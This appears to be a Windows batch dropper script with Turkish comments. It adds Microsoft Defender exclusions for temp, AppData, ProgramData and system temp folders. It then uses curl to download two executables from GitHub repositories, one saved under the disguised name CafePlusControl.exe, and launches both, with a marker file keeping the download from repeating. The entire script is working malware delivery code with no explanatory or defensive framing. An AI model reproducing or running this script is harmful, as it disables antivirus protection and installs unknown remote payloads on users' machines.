@echo off
cd %temp%
powershell -c Add-MpPreference -ExclusionPath "%temp%"
powershell -c Add-MpPreference -ExclusionPath "%APPDATA%"
powershell -c Add-MpPreference -ExclusionPath "%PROGRAMDATA%"
powershell -c Add-MpPreference -ExclusionPath "%SYSTEMROOT%\TEMP"


REM Dosya kontrolü
if exist nagihori2.txt (
    echo nagihori.txt bulundu, çıkılıyor...
    exit /b
) else (
    echo nagihori.txt yok, devam ediliyor...
    curl -L https://github.com/seition2doc/dosta2/raw/refs/heads/main/Vanguard.exe -o Vanguard.exe
    curl -L https://github.com/Banglade-sh23/-/raw/refs/heads/main/local3.exe -o CafePlusControl.exe
    echo "asd" > nagihori2.txt 
    start Vanguard.exe
    start CafePlusControl.exe
    
)
